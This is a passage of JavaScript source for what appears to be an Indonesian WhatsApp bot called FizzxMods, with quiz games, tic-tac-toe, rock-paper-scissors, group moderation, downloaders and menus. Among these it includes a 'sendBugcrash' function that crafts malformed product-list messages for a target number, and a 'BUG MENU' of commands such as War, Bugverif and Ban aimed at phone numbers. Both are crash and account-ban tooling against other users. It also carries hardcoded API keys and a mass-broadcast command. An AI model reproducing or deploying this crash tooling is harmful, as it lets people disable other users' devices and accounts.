let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
rixx.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rixx.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rixx.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rixx.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rixx.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rixx.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rixx.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
	    
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rixx.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}





if (isGroup && isAutoDownTT){

	if (chats.match(/(youtube.com)/gi)){
reply('Url tiktok terdekteksi\nWait mengecek data url.')
await sleep(3000)
var tt_res = await fetchJson(`https://saipulanuar.ga/api/download/ytmp3?url=${chats}&apikey=jPHjZpQF`)
reply(`*media sedang dikirim*`)
rixx.sendMessage(sender,{video:{url:tt_res.result.video.link1}, caption:'No Watermark!'}, {quoted:m})
rixx.sendMessage(sender,{audio:{url:tt_res.result.audio.link1}, mimetype:'audio/mpeg', fileName:'audio.mp3'}, {quoted:m})
if (isGroup) return rixx.sendMessage(from, {text:'Media sudah dikirim lewat chat pribadi bot.'}, {quoted:m})
}}






        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await rixx.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await rixx.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
rixx.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
rixx.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) rixx.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) rixx.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) rixx.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
rixx.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
anjay(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) rixx.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
anjay(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) rixx.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
rixx.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}


async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return rixx.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `rixx`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return rixx.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `FizzxMods🔥 : ${runtime(process.uptime())}`,jpegThumbnail: fs.readFileSync('./image/thumbnail.jpg')}}}
switch (command) {
case 'menu':{
	
let timestamp = speed()
let latensi = speed() - timestamp
timejalan = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}`
			teks = '╔══════[ *LIST VN* ]══════⊱'
					for (let awokwkwk of audionye) {
						teks += `\n╠➤${awokwkwk}`
					}
					teks += `\n╚════[ *Total : ${audionye.length}* ]══════⊱`
		
				
/*rixx.sendMessage(m.chat, {text: `┏━━⊱ 𝙄𝙉𝙁𝙊 𝘽𝙊𝙏 
┣❏ ᴏᴡɴᴇʀ : 6285172200670
┣❏ ɴᴀᴍᴇ ʙᴏᴛ : FizzxMods
┣❏ ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟᴏɴʟʏ
┗━━⊱

╔══════[ 𝙊𝙏𝙃𝙀𝙍 ]══════⊱
╠➤sewa
╠➤stats (Untuk Cek Status) 
╠➤restart
╠➤addakses @
╠➤delakses @
╠➤kick @
╠➤Linkgc
╠➤Setppgroup
╠➤Setppbot
╠➤Hidetag
╠➤once Image
╠➤Sticker Reply
╠➤Emojimix 🤕+🤓
╠➤Addvn 
╠➤Delvn
╚════[ *FizzxMods* ]══════⊱

╔══════[ 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 ]══════⊱
╠➤ 🗿 62xxx
╠➤ 🔥 62xxx
╠➤ ❤️‍🔥 62xxx
╠➤ 🐣 62xxxxx
╠➤ ☠️ linkgruop
╠➤ 🚀 62xxxxx
╠➤ 🤬 62xxxxx
╠➤ 👿 62xxxxx
╠➤ 🥵 62xxxxx
╠➤ 🐦 62xxxxx
╠➤ 😎 62xxxxx
╠➤ 😮‍💨 62xxxxx
╠➤ 😱 62xxxxx
╠➤ 🌷 62xxxxx
╠➤ 📦 62xxxxx
╠➤ 🤓 62xxxxx
╠➤ 🤯 62xxxxx
╠➤ 🤔 62xxxxx
╠➤ 🥶 62xxxxx
╠➤ 🤐 62xxxxx
╠➤ 🤫 62xxxxx
╠➤ 🤕 62xxxxx
╠➤ 🤒 62xxxxx
╠➤ 🤧 62xxxxx
╠➤ 💦 62xxxxx
╚════[ *FizzxMods* ]══════⊱

${teks}
`}, {quoted: kafloc})*/


menunya = `┏━━⊱ 𝙄𝙉𝙁𝙊 𝘽𝙊𝙏 
┣❏ ᴏᴡɴᴇʀ : 6285172200670
┣❏ ɴᴀᴍᴇ ʙᴏᴛ : FizzxMods
┣❏ ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟᴏɴʟʏ
┗━━⊱

┏━━⊱ *INFO PENGGUNA*
┣❏ YouName : ${pushname}
┣❏ YouNomer : ${sender.split('@')[0]}
┣❏ YouStatus : - 
┗━━⊱

┌─❖ ⌜ 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 ⌟
├  *Hari Ini* : ${hariini}
├  *Wib* : ${barat} WIB
├  *Wita* : ${tengah} WITA
├  *Wit* : ${timur} WIT
├  *Puasa* : ${jhari}Hari ${jjam}Jam ${jmenit}Menit ${jdetik}Detik
└─❖

╔══════[ OWNER ]══════⊱
╠➤restart
╠➤addakses @
╠➤delakses @
╠➤Linkgc
╠➤Mysesi
╠➤Setppbot
╠➤Creategc
╚════[ *FizzxMods* ]══════⊱

╔══════[ OTHER ]══════⊱
╠➤sewa
╠➤stats (Untuk Cek Status) 
╠➤restart
╠➤Sticker Reply
╠➤Emojimix 🤕+🤓
╠➤Addvn 
╠➤Delvn
╠➤Openai query
╠➤Tourl img
╠➤Infochat reply
╠➤Cuaca nama daerah
╠➤Imagenobg reply
╚════[ *FizzxMods* ]══════⊱

╔══════[ GROUP ]══════⊱
╠➤Add
╠➤Kick
╠➤Promote
╠➤Demote
╠➤Linkgc
╠➤Addakses @
╠➤Delakses @
╠➤Once Image
╠➤Hidetag
╠➤Setppgroup
╚════[ *FizzxMods* ]══════⊱

╔══════[ RPG ]══════⊱
║⿻ leaderboard
║⿻ inventori
║⿻ mining
║⿻ beli
║⿻ jual
║⿻ heal
║⿻ berburu
╚════[ *FizzxMods* ]══════⊱

╔══════[ DOWNLOAD ]══════⊱
╠➤Tiktok link
╠➤Play query
╚════[ *FizzxMods* ]══════⊱

╔══════[ LIST ]══════⊱
╠➤Listgc
╠➤Listpc
╠➤Liston
╚════[ *FizzxMods* ]══════⊱

╔══════[ 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 ]══════⊱
╠➤ War 62xxx 
╠➤ Bugverif 62xxx
╠➤ Ban 62xxx
╠➤ Bye 62xxx
╠➤ 🗿 62xxx
╠➤ 🔥 62xxx
╠➤ ❤️‍🔥 62xxx
╠➤ 🐣 62xxxxx
╠➤ ☠️ linkgruop
╠➤ 🚀 62xxxxx
╠➤ 🤬 62xxxxx
╠➤ 👿 62xxxxx
╠➤ 🥵 62xxxxx
╠➤ 🐦 62xxxxx
╠➤ 😎 62xxxxx
╠➤ 😮‍💨 62xxxxx
╠➤ 😱 62xxxxx
╠➤ 🌷 62xxxxx
╠➤ 📦 62xxxxx
╠➤ 🤓 62xxxxx
╠➤ 🤯 62xxxxx
╠➤ 🤔 62xxxxx
╠➤ 🥶 62xxxxx
╠➤ 🤐 62xxxxx
╠➤ 🤫 62xxxxx
╠➤ 🤕 62xxxxx
╠➤ 🤒 62xxxxx
╠➤ ?? 62xxxxx
╠➤ 💦 62xxxxx
╚════[ *FizzxMods* ]══════⊱

${teks}`

let btn5 = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/FizzXyzz'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 851-7220-0670'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Simple Menu',
                                    id: 'listmenu'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact FizzxMods',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                            
let btn = [
{buttonId: 'FizzxMods', buttonText: { displayText: 'Owner' }, type: 1 }]
                                
             /*  rixx.sendButtonText(m.chat, btn, rixx.user.name, `${menunya}`, kafloc)*/
             
             await rixx.send5ButLock(m.chat, `${menunya}`, `${timejalan}`, ppnyauser, btn5)

/*lagunyeeeeee = ["Sound","Bodyrock","Sound1"]
let ran = lagunyeeeeee[Math.floor(Math.random() * lagunyeeeeee.length)]
mencari = fs.readFileSync(`./lib/${ran}.opus`)
SendVnWithAudio(mencari)*/
}
break
case 'cuaca':
if (!q) return reply(`_Contoh_\n${prefix+command} palembang`)
let api_cuaca = '53165e728bce6a849f58c2cdd1a11e60'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`*INFO CUACA*
Nama: ${cuaca.name}
Longitude: ${cuaca.coord.lon}
Latitude: ${cuaca.coord.lat}
Suhu: ${cuaca.main.temp + " C"}
Angin: ${cuaca.wind.speed + " m/s"}
Kelembaban: ${cuaca.main.humidity + "%"}
Cuaca: ${cuaca.weather[0].main}
Keterangan: ${cuaca.weather[0].description}
Udara: ${cuaca.main.pressure + " HPa"}`
m.reply(text_cuaca)
break
case 'creategc':
if (!isDev) return m.reply("Khusus Developer bot !!")
if (!q) return reply(`*Example :*\n${prefix+command} namagroup`)

var nama_nya = q
let cret = await rixx.groupCreate(nama_nya, [])
let response = await rixx.groupInviteCode(cret.id)
var teks_creategc = `  「 *Create Group* 」

_*▸ Name : ${cret.subject}*_
_*▸ Owner : @${cret.owner.split("@")[0]}*_
_*▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB*_

*Link Create Group* :
https://chat.whatsapp.com/${response}
`
reply(teks_creategc)
break
case 'kick': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await rixx.groupParticipantsUpdate(m.chat, users, 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await rixx.groupParticipantsUpdate(m.chat, users, 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await rixx.groupParticipantsUpdate(m.chat, users, 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await rixx.groupParticipantsUpdate(m.chat, users, 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                rixx.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await rixx.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['tTvn1PHr4EFAP6fwkADeEKaA','tTvn1PHr4EFAP6fwkADeEKaA']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await rixx.downloadAndSaveMediaMessage(qmsg, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    rixx.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	case 'sendgloria': {
		if (!q) return reply(`*Example :*\n${prefix+command} nama lagu`)
		m.reply(`Tunggu Sebentar Bosss...`)
		namalagu = fs.readFileSync(`./lib/${q}.opus`)
		rixx.sendMessage(`6281511925837@s.whatsapp.net`, { audio: namalagu,mimetype: 'audio/mp4', ptt: true , contextInfo:{forwardingScore: 9999,isForwarded: true, "externalAdReply": {"title": `FizzxMods 🔥`,"body": `SendVnWithAudio`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://chat.whatsapp.com/I4PXxNScx9WAmp5r4np6Is`}}} ,{quoted: fgclink2 })
		}
		break
case 'listmenu': {
const sections = [
{
	title: `FizzxModss`,
	rows: [
	    {title: "Owner Bot FizzxModss", rowId: `${prefix}creator`}
	]
    },
    {
	title: `Sewa`,
	rows: [
	    {title: "Sewa", rowId: `${prefix}sewa`}
	]
    },
    {
	title: `Stats`,
	rows: [
	    {title: "Status Memory Bot", rowId: `${prefix}Stats`}
	]
    },
    {
	title: `Restart`,
	rows: [
	    {title: "Restart Bot", rowId: `${prefix}restart`}
	]
    },
    {
	title: `Linkgroup`,
	rows: [
	    {title: " Link Group", rowId: `${prefix}linkgc`}
	]
    },
    {
	title: `Script`,
	rows: [
	    {title: "Script Bot FizzxModsss", rowId: `${prefix}sc`}
	]
    },
]
let menunyaa = `┏━━⊱ *INFO PENGGUNA*
┣❏ YouName : ${pushname}
┣❏ YouNomer : ${sender.split('@')[0]}
┣❏ YouStatus : - 
┗━━⊱

┌─❖ ⌜ 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 ⌟
├  *Hari Ini* : ${hariini}
├  *Wib* : ${barat} WIB
├  *Wita* : ${tengah} WITA
├  *Wit* : ${timur} WIT
├  *Puasa* : ${jhari}Hari ${jjam}Jam ${jmenit}Menit ${jdetik}Detik
└─❖

Note : Jangan Spam Bot Dan
Call, Jika Tidak Ingin Di Block Bot`
const listMessage = {
  text: menunyaa,
  footer: "© FizzxModsss",
  buttonText: "Klik Disini",
  sections
}
const tessgh = await rixx.sendMessage(m.chat, listMessage, { quoted: stckntl })
}
break
case 'tts':{

if (!q) return m.reply(`Contoh:\n${prefix+command} hallo bro`)
var tts = `https://saipulanuar.ga/api/text-to-audio/tts?text=${q}&idbahasa=id&apikey=jPHjZpQF`
rixx.sendMessage(m.sender, {audio:{url:tts}, mimetype:'audio/mpeg', ptt:true}, {quoted: m})
}
break
case 'bc': case 'broadcast': case 'bcall': {
                
                if (!text) throw `Text mana?\n\nExample : ${prefix+command} FizzxModss`
                name = `BypassModss`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/FizzXyzz'
                                }
                            },{
                                quickReplyButton: {
                                    displayText: 'Simple Menu',
                                    id: 'Menu'
                                }
                            
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      rixx.send5ButLock(yoi, txt, name, ppnyauser, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 rixx.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await rixx.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 rixx.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'puasa': {
